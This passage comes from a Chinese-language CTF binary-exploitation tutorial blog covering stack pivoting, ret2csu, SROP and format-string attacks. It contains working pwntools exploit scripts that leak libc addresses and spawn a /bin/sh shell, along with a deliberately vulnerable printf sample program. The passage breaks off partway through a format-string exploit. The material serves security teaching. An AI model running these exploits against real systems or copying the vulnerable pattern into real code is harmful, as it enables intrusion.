指令，将栈迁移到 bss 段中</span></span><br><span class="line"><span class="string">    在bss段中构造指令泄露 read 函数真实地址，</span></span><br><span class="line"><span class="string">    从而获取 libc 的基地址，进而获取 system 函数地址</span></span><br><span class="line"><span class="string">    因为全局变量 b 太靠近不可写的段了，</span></span><br><span class="line"><span class="string">    所以需要将栈迁移到较高地址处，然后执行 system(&quot;/bin/sh&quot;) </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">b_add=<span class="number">0x404060</span></span><br><span class="line">read_got=<span class="number">0x404020</span></span><br><span class="line">read=<span class="number">0x401182</span></span><br><span class="line">write_plt=<span class="number">0x401050</span></span><br><span class="line">read_plt=<span class="number">0x401060</span></span><br><span class="line">rdi=<span class="number">0x401263</span></span><br><span class="line">rsi_15=<span class="number">0x401261</span></span><br><span class="line">leave=<span class="number">0x4011d4</span></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn_tran&#x27;</span>,checksec=<span class="number">0</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.33.so&#x27;</span>,checksec=<span class="number">0</span>)</span><br><span class="line">p=process(<span class="string">&#x27;pwn_tran&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(b_add))</span><br><span class="line">p.sendline(p64(b_add)+p64(rdi)+p64(<span class="number">1</span>)+p64(rsi_15)+p64(read_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(read))</span><br><span class="line">p.read(<span class="number">0x60</span>)</span><br><span class="line">d=u64(p.read(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(d))</span><br><span class="line">libc.address=d-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(b_add+<span class="number">0x808</span>)+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi_15)+p64(b_add+<span class="number">0x808</span>)+p64(<span class="number">0</span>)+p64(read_plt)+p64(leave)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(p64(b_add+<span class="number">0x900</span>)+p64(rdi)+p64(bin_sh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>当在执行某些函数或系统调用时需要设置 <code>rdi,rsi,rdx</code> 寄存器时，可以使用<code>ret2csu</code>方法设置寄存器<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-csu.jpg"></p>
+<p>利用下半段指令控制寄存器，利用上半段指令设置<code>rdi,rsi,rdx</code>寄存器，并执行指定地址储存的函数地址(也可以是指令地址)，函数或指令的地址通过 <code>r15+rbx*8</code> 获取,所以需要先在已知地址处写入函数或指令的地址(也可以是got表中的成员)<br>在控制寄存器时一般设置 <code>rbx=0,rbp=1</code> 这样可以跳出上半段的循环，设置<code>r15</code>为函数地址的二级指针，设置<code>r12</code>为<code>rdi</code>的值(仅支持4字节)，<code>r13</code>为<code>rsi</code>的值，<code>r14</code>为<code>rdx</code>的值，就将64位程序的前三个参数设置好了</p>
+<blockquote>
+<p>在我的理解中，<code>ret2csu</code>就是用来修改 <code>rdx</code>寄存器的值，因为存在<code>__libc_csu_init</code>函数就存在 <code>pop rdi</code> 与 <code>pop rsi;pop r15</code>指令 ，这样就解决了前两个参数，而<code>pop rdx</code>指令一般不存在，所以需要利用<code>ret2csu</code>设置</p>
+</blockquote>
+<p>仅在<code>64位程序</code>中使用，因为<code>64位程序</code>使用寄存器传参，而<code>32位程序</code>的参数储存在栈中，不需要再单独通过<code>ret2csu</code>控制参数</p>
+<p>样例为<code>buuctf</code>中的<code>ciscn_2019_s_3</code>题目</p>
+<blockquote>
+<p><strong>main函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-SROP.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>vuln函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-SROP-1.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>vuln函数栈布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-SROP-2.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>vuln函数汇编代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-SROP-3.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>可利用的指令</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-SROP-4.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>函数列表</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-SROP-5.jpg"></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    先通过write(0,buf,0x30) 获取栈地址，</span></span><br><span class="line"><span class="string">    然后将/bin/sh写入栈中，</span></span><br><span class="line"><span class="string">    利用ret2csu，设置rdx,rsi为0，</span></span><br><span class="line"><span class="string">    然后设置rdi为 /bin/sh 的地址</span></span><br><span class="line"><span class="string">    最后调用 execve(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x00000000004005a3</span></span><br><span class="line">pops=<span class="number">0x40059a</span></span><br><span class="line">call=<span class="number">0x400580</span></span><br><span class="line">syscall=<span class="number">0x400517</span></span><br><span class="line">execve=<span class="number">0x4004e2</span></span><br><span class="line">ret=<span class="number">0x4005a4</span></span><br><span class="line">vuln=<span class="number">0x4004ed</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(vuln)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.read(<span class="number">0x20</span>)</span><br><span class="line">stack=u64(p.read(<span class="number">8</span>))-<span class="number">0x118</span>-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">payload=<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(ret)+p64(pops)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stack+<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(call)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(execve)+p64(rdi)+p64(stack)+p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>利用系统调用sigreturn设置所有寄存器值为栈中的数据 </p>
+<p>样例为<code>buuctf</code>中的<code>ciscn_2019_s_3</code>题目</p>
+<blockquote>
+<p><strong>main函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-SROP.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>vuln函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-SROP-1.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>vuln函数栈布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-SROP-2.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>vuln函数汇编代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-SROP-3.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>可利用的指令</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-SROP-4.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>函数列表</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-SROP-5.jpg"></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    利用SROP 设置寄存器的值，构造read(0,bss,0x300)，并将栈迁移到bss+8上</span></span><br><span class="line"><span class="string">    然后再次利用SROP 设置寄存器的值，构造execve(&quot;/bin/sh&quot;) 获取shell</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line">bss=<span class="number">0x601030</span></span><br><span class="line">sig=<span class="number">0x4004da</span></span><br><span class="line">syscall=<span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">execve=SigreturnFrame()</span><br><span class="line">execve.rdi=bss</span><br><span class="line">execve.rsi=<span class="number">0</span></span><br><span class="line">execve.rdx=<span class="number">0</span></span><br><span class="line">execve.rsp=bss+<span class="number">0x300</span></span><br><span class="line">execve.rbp=bss</span><br><span class="line">execve.rax=<span class="number">0x3b</span></span><br><span class="line">execve.rip=syscall</span><br><span class="line"></span><br><span class="line">read=SigreturnFrame()</span><br><span class="line">read.rdi=<span class="number">0</span></span><br><span class="line">read.rsi=bss</span><br><span class="line">read.rdx=<span class="number">0x300</span></span><br><span class="line">read.rsp=bss+<span class="number">0x8</span></span><br><span class="line">read.rbp=bss+<span class="number">0x100</span></span><br><span class="line">read.rax=<span class="number">0</span></span><br><span class="line">read.rip=syscall</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(sig)+p64(syscall)+<span class="built_in">str</span>(read))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sig)+p64(syscall)+<span class="built_in">str</span>(execve))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><p>利用程序直接对用户可控制的数据格式化，让用户可以利用格式化字符串达到任意地址读写<br>因为格式化字符串的参数在栈中，所以尽管无法写，也可以从栈中获取些有用的信息</p>
+<h2 id="先行知识"><a href="#先行知识" class="headerlink" title="先行知识"></a>先行知识</h2><p><code>printf</code>实际执行的是位于<code>stdio-common/vfprintf-internal.c</code>文件中的<code>vfprintf函数</code><br>在<code>vfprintf</code>中会按照占位符的顺序输出字符串，但如果占位符中存在<code>$</code>就会执行<code>printf_positional</code>函数<br>在<code>printf_positional</code>函数中会先将 字符串 中所有占位符都搜索出来，储存在数组中，然后遍历数组根据占位符类型输出字符串</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在格式化字符串时会用到6个这样的表，用来防止存在歧义 */</span></span><br><span class="line"><span class="comment">/* Step 0: at the beginning.  */</span></span><br><span class="line"><span class="type">static</span> JUMP_TABLE_TYPE step0_jumps[<span class="number">30</span>] =</span><br><span class="line">&#123; <span class="comment">// 在下面，如果不存在对应类型的参数，则将剩下的参数中的第一个，强制转换为对应参数</span></span><br><span class="line">   <span class="comment">// 说是参数，实际上是栈中的值 在64位中，前六个参数使用寄存器</span></span><br><span class="line">  REF (form_unknown),</span><br><span class="line">  REF (flag_space),      <span class="comment">/* for &#x27; &#x27;          使用空格作为填充 默认也是空格*/</span></span><br><span class="line">  REF (flag_plus),       <span class="comment">/* for &#x27;+&#x27;          在正数前面添加 &#x27;+&#x27; */</span></span><br><span class="line">  REF (flag_minus),      <span class="comment">/* for &#x27;-&#x27;          右对齐*/</span></span><br><span class="line">  REF (flag_hash),       <span class="comment">/* for &#x27;&lt;hash&gt;&#x27; #     使用#号触发 与x 组合表示使用 0x??的格式 与 X组合表示使用 0X??的格式</span></span><br><span class="line"><span class="comment">                                                             与g/G 组合表示用0填充小数位*/</span></span><br><span class="line">  REF (flag_zero),       <span class="comment">/* for &#x27;0&#x27;          使用0作为填充仅在左对齐时有效*/</span></span><br><span class="line">  REF (flag_quote),      <span class="comment">/* for &#x27;\&#x27;&#x27;         暂时不知道用处*/</span></span><br><span class="line">  REF (width_asterics),  <span class="comment">/* for &#x27;*&#x27;          从printf后面的参数中获取整数类型参数作为输出宽度 宽度不能大于2147483647*/</span></span><br><span class="line">  REF (width),           <span class="comment">/* for &#x27;1&#x27;...&#x27;9&#x27;    这一条没有明确代码，但与 width_asterics 在一起执行，将字符串转换为整数 宽度不能大于2147483647</span></span><br><span class="line"><span class="comment">                     当数字后面是 $ 字符时，将数字作为偏移 */</span></span><br><span class="line">  REF (precision),       <span class="comment">/* for &#x27;.&#x27;          在搜索到 . 之后，如果后面的字符为 * 则将printf 中未使用过的参数中的整数作为小数长度位</span></span><br><span class="line"><span class="comment">                                                                    如果后面的字符为数字，就将数字作为小数位长度*/</span></span><br><span class="line">  REF (mod_half),        <span class="comment">/* for &#x27;h&#x27;          将数据当作 二字节数据处理 ，但如果两个h连在一起 则将数据作为 一字节数据处理*/</span></span><br><span class="line">  REF (mod_long),        <span class="comment">/* for &#x27;l&#x27;          将数据作为 四字节数据处理*/</span></span><br><span class="line">  REF (mod_longlong),    <span class="comment">/* for &#x27;L&#x27;, &#x27;q&#x27;     将数据作为 八字节数据处理*/</span></span><br><span class="line">  REF (<span class="type">mod_size_t</span>),      <span class="comment">/* for &#x27;z&#x27;, &#x27;Z&#x27;     通过 size_t 判断 将数据作为 四字节 还是 八字节处理*/</span></span><br><span class="line">  REF (form_percent),    <span class="comment">/* for &#x27;%&#x27;          输出 %*/</span></span><br><span class="line">  REF (form_integer),    <span class="comment">/* for &#x27;d&#x27;, &#x27;i&#x27;     将数据以十进制有符号整型的方式输出*/</span></span><br><span class="line">  REF (form_unsigned),   <span class="comment">/* for &#x27;u&#x27;          将数据以十进制无符号整型的方式输出*/</span></span><br><span class="line">  REF (form_octal),      <span class="comment">/* for &#x27;o&#x27;          将数据以八进制无符号整型的方式输出*/</span></span><br><span class="line">  REF (form_hexa),       <span class="comment">/* for &#x27;X&#x27;, &#x27;x&#x27;     将数据以十六进制无符号整型的方式输出</span></span><br><span class="line"><span class="comment">                                                    使用X表示以大写十六进制输出</span></span><br><span class="line"><span class="comment">                                                    使用x表示以小写十六进制输出*/</span></span><br><span class="line">  REF (form_float),      <span class="comment">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27;   e/E 表示以指数的形式输出小数，区别为输出时e的大小写</span></span><br><span class="line"><span class="comment">                                                           f/F 表示以普通小数的形式输出小数，区别在于 当小数为无限小数或小数位过长时，输出的 inf,infinity,nan的大小写</span></span><br><span class="line"><span class="comment">                                                           g/G 按数值大小自动区分使用e或f 区别也是大小写*/</span></span><br><span class="line">  REF (form_character),  <span class="comment">/* for &#x27;c&#x27;          将参数中剩下的第一个整数作为字符输出*/</span></span><br><span class="line">  REF (form_string),     <span class="comment">/* for &#x27;s&#x27;, &#x27;S&#x27;     将printf参数中第一个参数，作为字符指针，输出指向的字符串*/</span></span><br><span class="line">  REF (form_pointer),    <span class="comment">/* for &#x27;p&#x27;          将printf参数中第一个指针 使用 %#x 的形式输出 当指针不存在时 使用整数*/</span></span><br><span class="line">  REF (form_number),     <span class="comment">/* for &#x27;n&#x27;          将当前输出的长度，写入到printf参数中剩下的第一个参数指向的位置*/</span></span><br><span class="line">  REF (form_strerror),   <span class="comment">/* for &#x27;m&#x27;          按照当前错误信息输出错误，当没有错误时输出 Success*/</span></span><br><span class="line">  REF (form_wcharacter), <span class="comment">/* for &#x27;C&#x27;          将printf参数中剩下的第一个 wchar_t 类型的参数，输出*/</span></span><br><span class="line">  REF (form_floathex),   <span class="comment">/* for &#x27;A&#x27;, &#x27;a&#x27;     按照十六进制的形式输出小数*/</span></span><br><span class="line">  REF (<span class="type">mod_ptrdiff_t</span>),   <span class="comment">/* for &#x27;t&#x27;          通过 ptrdiff_t 判断 将数据作为 四字节 还是 八字节处理*/</span></span><br><span class="line">  REF (<span class="type">mod_intmax_t</span>),    <span class="comment">/* for &#x27;j&#x27;          通过 intmax_t 判断 将数据作为 四字节 还是 八字节处理*/</span></span><br><span class="line">  REF (flag_i18n),       <span class="comment">/* for &#x27;I&#x27;          暂时不知道用处*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">数据宽度</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">h</td>
+<td>将数据作为<code>short</code>类型处理</td>
+</tr>
+<tr>
+<td align="center">hh</td>
+<td>将数据作为<code>char</code>类型处理</td>
+</tr>
+<tr>
+<td align="center">l</td>
+<td>将数据作为<code>long</code>类型处理</td>
+</tr>
+<tr>
+<td align="center">q&#x2F;L</td>
+<td>将数据作为<code>long long</code>类型处理</td>
+</tr>
+<tr>
+<td align="center">z&#x2F;Z</td>
+<td>通过<code>size_t</code>判断，将数据作为<code>long</code>类型处理还是以<code>long long</code>类型处理</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">标志</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">space</td>
+<td>使用空格作为填充符号</td>
+</tr>
+<tr>
+<td align="center">+</td>
+<td>在正数的前面添加<code>+</code></td>
+</tr>
+<tr>
+<td align="center">-</td>
+<td>右对齐(默认左对齐)</td>
+</tr>
+<tr>
+<td align="center">#</td>
+<td>与<code>x/X</code>组合表示以<code>0x???</code>的形式输出，与<code>g/G</code>组合表示不省略小数结尾的<code>0</code></td>
+</tr>
+<tr>
+<td align="center">0</td>
+<td>表示使用0作为填充符号(仅右对齐时有效)</td>
+</tr>
+<tr>
+<td align="center">*</td>
+<td>将参数中最前面的整数作为输出数据的最小长度 (最大为<code>2147483647</code>)</td>
+</tr>
+<tr>
+<td align="center">0~9</td>
+<td>将字符串转换后的整数作为输出数据的最小长度 (最大为<code>2147483647</code>，为负数时表示右对齐)</td>
+</tr>
+<tr>
+<td align="center">$</td>
+<td>通过<code>$</code>前的数字获取参数的索引值，用于指定占位符处理的数据</td>
+</tr>
+<tr>
+<td align="center">.</td>
+<td>.数字 用来指定浮点数精度 或 字符串输出的最大长度</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">类型</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">x</td>
+<td>将无符号整型以全小写十六进制的形式输入输出</td>
+</tr>
+<tr>
+<td align="center">X</td>
+<td>将无符号整型以全大写十六进制的形式输入输出</td>
+</tr>
+<tr>
+<td align="center">o</td>
+<td>将无符号整型以八进制的形式输入输出</td>
+</tr>
+<tr>
+<td align="center">u</td>
+<td>将无符号整型以十进制的形式输入输出</td>
+</tr>
+<tr>
+<td align="center">d</td>
+<td>将有符号整型以十进制的形式输入输出</td>
+</tr>
+<tr>
+<td align="center">i</td>
+<td>输入输出有符号整型(将开头为0的数字识别为八进制，将开头为0x的数字识别为十六进制)</td>
+</tr>
+<tr>
+<td align="center">f</td>
+<td>以定点数表示法输出浮点数 (当浮点数 为 无限浮点数时输出<code>inf</code>,当 浮点数 无法作为数字处理时输出<code>nan</code>)</td>
+</tr>
+<tr>
+<td align="center">F</td>
+<td>以定点数表示法输出浮点数 (当浮点数 为 无限浮点数时输出<code>INF</code>,当 浮点数 无法作为数字处理时输出<code>NAN</code>)</td>
+</tr>
+<tr>
+<td align="center">e</td>
+<td>以指数表示法输出浮点数 (当浮点数 为 无限浮点数时输出<code>inf</code>,当 浮点数 无法作为数字处理时输出<code>nan</code>)</td>
+</tr>
+<tr>
+<td align="center">E</td>
+<td>以指数表示法全大写输出浮点数 (当浮点数 为 无限浮点数时输出<code>INF</code>,当 浮点数 无法作为数字处理时输出<code>NAN</code>)</td>
+</tr>
+<tr>
+<td align="center">g</td>
+<td>自动选择使用定点数或指数输出浮点数(效果为<code>f</code>和<code>e</code>的结合体)</td>
+</tr>
+<tr>
+<td align="center">G</td>
+<td>自动选择使用定点数或指数输出浮点数(效果为<code>F</code>和<code>E</code>的结合体)</td>
+</tr>
+<tr>
+<td align="center">a</td>
+<td>以十六进制的形式全小写输出浮点数(当小数为无限小数时输出<code>inf</code>,当小数无法作为数字处理时输出<code>nan</code>)</td>
+</tr>
+<tr>
+<td align="center">A</td>
+<td>以十六进制的形式全大写输出浮点数(当小数为无限小数时输出<code>INF</code>,当小数无法作为数字处理时输出<code>NAN</code>)</td>
+</tr>
+<tr>
+<td align="center">s</td>
+<td>输出指定地址中的数据 (以<code>\x00</code>截断) 输入时以<code>空格</code>或<code>\n</code>为截断</td>
+</tr>
+<tr>
+<td align="center">p</td>
+<td>以十六进制的形式输出 地址&#x2F;整数 (当 地址&#x2F;整数为 0 时输出 <code>(nil)</code> )</td>
+</tr>
+<tr>
+<td align="center">c</td>
+<td>以字符的形式输入输出数据</td>
+</tr>
+<tr>
+<td align="center">n</td>
+<td>将已经输出的数据长度 写入指定地址</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>使用 f&#x2F;F&#x2F;e&#x2F;E&#x2F;g&#x2F;G 输入 都可以识别 定点数表示法 和 指数表示法</p>
+</blockquote>
+<ul>
+<li>计算偏移<ul>
+<li>x86_64<blockquote>
+<p>通过 (需要使用的地址-调用printf时的rsp)&#x2F;8+6 获得<br>因为printf参数中除第一个为需要格式化的字符串，其他都是参数，<br>如果要获取rdi,rsi,rdx,rcx,r8,r9寄存器的值就使用 <code>0 &lt; s &lt; 6</code> 的偏移</p>
+</blockquote>
+</li>
+<li>x86<blockquote>
+<p>通过 (需要使用的地址-调用printf时的esp)&#x2F;4 获得</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>通过<code>n</code>进行任意写，通过<code>s</code>进行任意地址读，通过<code>p</code>获取栈中的数据</p>
+</blockquote>
+<h2 id="栈中格式化字符串"><a href="#栈中格式化字符串" class="headerlink" title="栈中格式化字符串"></a>栈中格式化字符串</h2><blockquote>
+<p>在栈中的格式化字符串比较简单，因为可以通过字符串中的地址，达到任意地址读写</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 示例代码 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x100</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(a,<span class="string">&quot;exit&quot;</span>,<span class="number">4</span>))&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 编译命令</span></span><br><span class="line"><span class="comment">    gcc pwn_format.c  -no-pie -o pwn_format </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>main函数代码(在此之上都是初始化变量的代码)<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format.jpg"></p>
+</blockquote>
+<blockquote>
+<p>main函数栈布局<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format-1.jpg"></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    因为 main 函数是由 __libc_start_main 函数调用，</span></span><br><span class="line"><span class="string">    那么在栈中就一定存在 __libc_start_main 函数中的地址，</span></span><br><span class="line"><span class="string">    通过获取 __libc_start_main 函数中的地址可以获取到 libc的基地址 ，</span></span><br><span class="line"><span class="string">    通过基地址获取 system 函数的地址，</span></span><br><span class="line"><span class="string">    然后设置程序 got表 中 printf 项的值为 system 函数地址，</span></span><br><span class="line"><span class="string">    这样在每次执行 printf 函数时就会执行 system 函数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; %41$p 计算过程</span></span><br><span class="line"><span class="string">    去除寄存器占用的 5 